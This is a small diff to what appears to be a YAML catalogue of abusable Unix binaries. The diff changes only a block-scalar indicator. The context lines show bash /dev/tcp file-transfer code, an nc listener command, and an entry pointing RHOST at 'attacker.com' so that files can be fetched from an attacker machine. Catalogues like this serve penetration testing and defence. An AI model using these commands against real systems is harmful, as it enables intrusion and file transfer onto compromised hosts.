@@ -29,7 +29,7 @@ functions:
             3<>/dev/tcp/$RHOST/$RPORT \
             | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
     - description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
-      code: |-
+      code: |
         export RHOST=attacker.com
         export RPORT=12345
         export LFILE=file_to_get
